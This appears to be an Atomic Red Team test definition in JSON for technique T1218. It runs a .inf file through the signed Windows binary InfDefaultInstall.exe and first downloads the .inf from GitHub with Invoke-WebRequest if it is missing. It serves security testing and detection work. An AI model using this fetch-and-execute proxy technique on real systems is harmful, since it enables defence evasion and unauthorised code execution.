{
  "id": "54ad7d5a-a1b5-472c-b6c4-f8090fb2daef",
  "name": "InfDefaultInstall.exe .inf Execution",
  "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "fa85e6ac-6a08-4c6e-9169-d77537581036",
      "type": "execute-command",
      "data": {
        "command": "InfDefaultInstall.exe \"#{inf_to_execute}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "776528f0-1a52-4d1b-a645-73b202fc166e",
      "name": "Check dependency 1/1",
      "description": "INF file must exist on disk at specified location (#{inf_to_execute})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "95e0bdfa-f799-4974-8f2c-6fa2e44035da",
      "name": "Resolve dependency 1/1",
      "description": "INF file must exist on disk at specified location (#{inf_to_execute})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf\" -OutFile \"#{inf_to_execute}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "c624c353-aacf-4c8f-95fd-d24f2948d771",
      "name": "Re-check dependency 1/1",
      "description": "INF file must exist on disk at specified location (#{inf_to_execute})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "776528f0-1a52-4d1b-a645-73b202fc166e",
      "p": "on-success",
      "o": "fa85e6ac-6a08-4c6e-9169-d77537581036"
    },
    {
      "s": "776528f0-1a52-4d1b-a645-73b202fc166e",
      "p": "on-failure",
      "o": "95e0bdfa-f799-4974-8f2c-6fa2e44035da"
    },
    {
      "s": "95e0bdfa-f799-4974-8f2c-6fa2e44035da",
      "p": "on-success",
      "o": "c624c353-aacf-4c8f-95fd-d24f2948d771"
    },
    {
      "s": "c624c353-aacf-4c8f-95fd-d24f2948d771",
      "p": "on-failure",
      "o": "fa85e6ac-6a08-4c6e-9169-d77537581036"
    }
  ],
  "tags": [
    "T1218",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "inf_to_execute",
      "type": "string",
      "description": "Local location of inf file",
      "value": "PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf"
    }
  ]
}